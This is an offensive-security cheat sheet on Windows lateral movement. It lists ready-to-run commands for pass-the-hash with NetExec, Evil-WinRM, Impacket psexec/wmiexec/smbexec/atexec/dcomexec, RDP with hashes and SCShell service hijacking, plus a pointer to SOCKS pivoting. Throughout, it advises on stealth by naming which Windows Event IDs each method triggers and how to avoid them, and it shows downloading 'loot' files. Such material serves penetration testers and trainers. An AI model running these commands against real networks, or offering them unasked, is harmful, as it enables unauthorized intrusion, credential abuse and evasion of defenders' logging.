# Windows Lateral Movement

!!! tip ""
    Check what's accessible before picking a method: port 5985/5986 → WinRM (`evil-winrm`), port 445 → SMB (`psexec`/`smbexec`), WMI is always worth trying if you have admin creds. WMI is stealthier than PsExec — it doesn't create a service (Event ID 7045).

---

## Pass-the-Hash

Use an NTLM hash directly without cracking it. Requires local admin rights on the target.

### NetExec (credential validation + command execution)

```bash
nxc smb 10.10.10.10 -u Administrator -H <ntlm-hash>
nxc smb 10.10.10.10 -u Administrator -H <ntlm-hash> -x "whoami"
nxc winrm 10.10.10.10 -u Administrator -H <ntlm-hash> -x "whoami"
```

### Evil-WinRM

```bash
evil-winrm -i 10.10.10.10 -u Administrator -H <ntlm-hash>
```

### Impacket PsExec

```bash
impacket-psexec Administrator@10.10.10.10 -hashes :<ntlm-hash>
```

### Impacket WMIExec

```bash
impacket-wmiexec Administrator@10.10.10.10 -hashes :<ntlm-hash>
```

---

## WinRM (Evil-WinRM)

Most comfortable interactive shell for post-exploitation. Requires port 5985 (HTTP) or 5986 (HTTPS) and membership in the Remote Management Users group or local admin.

```bash
evil-winrm -i 10.10.10.10 -u Administrator -p 'Password1'
evil-winrm -i 10.10.10.10 -u Administrator -H <ntlm-hash>
```

Upload/download files from within an `evil-winrm` session:

```powershell
upload /local/file.exe C:\Temp\file.exe
download C:\Temp\loot.txt /local/loot.txt
```

---

## PsExec (Service-Based)

Creates a temporary service on the target — reliable but loud (Event ID 7045: service installed).

```bash
impacket-psexec CORP/Administrator:'Password1'@10.10.10.10
impacket-psexec Administrator@10.10.10.10 -hashes :<ntlm-hash>
```

---

## WMI Execution (Stealthier)

No service creation. Generates Event ID 4688 (process creation). Preferred over PsExec when stealth matters.

```bash
impacket-wmiexec CORP/Administrator:'Password1'@10.10.10.10
impacket-wmiexec CORP/Administrator:'Password1'@10.10.10.10 "ipconfig /all"
impacket-wmiexec Administrator@10.10.10.10 -hashes :<ntlm-hash>
```

---

## RDP

```bash
xfreerdp /u:Administrator /p:'Password1' /v:10.10.10.10
xfreerdp /u:Administrator /pth:<ntlm-hash> /v:10.10.10.10
```

!!! warning "Watch out"
    RDP creates interactive login events (Event ID 4624 Type 10) and a visible desktop session. Only use when stealth is not required or the environment has RDP enabled by default.

---

## Alternative SMB Execution Methods

Try these when PsExec/WMI are blocked or flagged:

```bash
impacket-smbexec CORP/Administrator:'Password1'@10.10.10.10
impacket-atexec CORP/Administrator:'Password1'@10.10.10.10 "whoami"
impacket-dcomexec CORP/Administrator:'Password1'@10.10.10.10
```

---

## SCShell (Service-Modify, No New Service)

Modifies an existing service's `binPath`, triggers it, then restores the original — no service creation (no Event ID 7045), no file written to SMB, no named pipe. Quieter than PsExec when you have SERVICE_CHANGE_CONFIG.

```bash
scshell.py CORP/Administrator:'Password1'@10.10.10.10 xps 'C:\Temp\shell.exe'
```

Args: `<user>:<pass>@<host> <service-name> <command>`. Pick a rarely-used service like `XblAuthManager`, `RemoteRegistry`, or `Spooler` to reduce operational impact.

---

## SOCKS Pivot After Foothold

Once you have a shell on an internal host, a SOCKS proxy lets you run `nxc`, `evil-winrm`, and Impacket tools from your attacker box against the rest of the internal network without hopping through the shell manually.

See [Ligolo-ng & Chisel](../port-forwarding/ligolo-chisel.md) — ligolo-ng is the most reliable option for AD internal pivoting.
